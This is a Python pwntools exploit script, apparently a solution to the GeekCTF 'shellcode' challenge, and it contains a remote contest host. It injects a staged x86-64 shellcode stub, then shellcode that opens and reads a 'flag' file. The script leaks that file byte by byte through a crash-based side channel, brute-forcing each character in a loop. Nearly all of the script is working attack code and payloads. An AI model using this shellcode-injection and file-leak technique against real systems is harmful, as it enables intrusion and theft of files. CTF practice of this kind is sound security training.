# -*- coding: utf-8 -*-
from pwn import *
# context.log_level = 'INFO'
context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./shellcode')

one64 = [0x45226,0x4527a,0xf0364,0xf1207]


sl = lambda s : p.sendline(s.encode())
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode())
irt = lambda : p.interactive()

def ms(name,addr):
    print(name + "---->" + hex(addr))

def debug(mallocr,PIE=True):
    if PIE:
        # print(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0])
        text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))

asm1 = asm(
   "push   rax;\n"                          # 0:   50                      
   "pop    rbx;\n"                          # 1:   5b                      
   "xor    rax,rax;\n"                      # 2:   48 31 c0                  
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51  
   "add    BYTE PTR [rbx+0xc], 0x1;\n"      # 8:   80 43 0c 01             
   "push   r11;\n"                          # c:   41 53                   
   "pop    rdx;\n"                          # e:   5a                      
   "push   rbx;\n"                          # 2:   53 
   "push   rdx;\n"                          # 3:   52  
   "push   rcx;\n"                          # 4:   51 
   "add    BYTE PTR [rbx+0x16], 0x1;\n"     # 12:   80 43 16 01             
   "syscall;\n"                             # 16:   0f 05                   
   "nop;\n"                                 # 18:   90                      
)

asm1 = b"\x50" \
        b"\x5b" \
        b"\x48\x31\xc0" \
        b"\x53\x52\x51" \
        b"\x80\x43\x0c\x01" \
        b"\x40\x53" \
        b"\x5a" \
        b"\x53\x52\x51" \
        b"\x80\x43\x16\x01" \
        b"\x0e\x05" \
        b"\x90"


flag = ''

for i in range(0x50):
    if local:
        p = process('./shellcode')
        libc = elf.libc
    else:
        p = remote('chall.geekctf.geekcon.top',40245)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    debug(0x13d5,1)
    pause()
    p.sendafter(b"shellcode: ",asm1)
    shellcode = asm(
        # we already input "flag\0" at RSI, now we open it
        "mov rax, 2\n"
        "mov r10, rsi\n"
        "mov rdi, rsi\n"
        "push rdi\n"
        "pop rdi\n"
        "xor rsi, rsi\n"
        "xor rdx, rdx\n"
        "syscall\n"
        # read flag content
        "lea rsi, [r10 + 0x400]\n"
        "mov rdi, rax\n"
        "xor rax, rax\n"
        "mov rdx, 0x100\n"
        "syscall\n"
        # read i-th character into r8b
        # we also want to crash directly if this is null-byte
        "next:\n"
        "mov r8b, byte ptr [r10 + 0x400 + {}]\n"
        "cmp r8b, 0\n"
        "jz end\n"
        # loop reading from stdin until equal
        "loop:\n"
        "lea rsi, [r10 + 0x800]\n"
        "mov rdi, 0\n"
        "xor rax, rax\n"
        "mov rdx, 0x1\n"
        "syscall\n"

        "mov r9b, byte ptr [r10 + 0x800]\n"
        "cmp r8b, r9b\n"
        "jnz loop\n"
        # crash
        "end:\n"
        "hlt\n".format(str(i))
        )
    p.sendline(b"flag\x00"+b'\x90'*0x20 + shellcode)
    print("==========flag: " + flag)
    stringtable = "0123456789abcdefghijklmnopqrstuvwxyz{}-_"
    # stringtable = string.printable
    for j in stringtable:
        try:
            print("try: " + j)
            pause()
            p.sendline(j.encode())
            sleep(0.4)
            p.sendline(b'\xff')
            p.sendline(b'\xff')
            if(j == stringtable[len(stringtable)-1]):
                flag += 'X' 
        except:
            p.close()
            flag += j
            success("flag maybe: " + flag)
            break
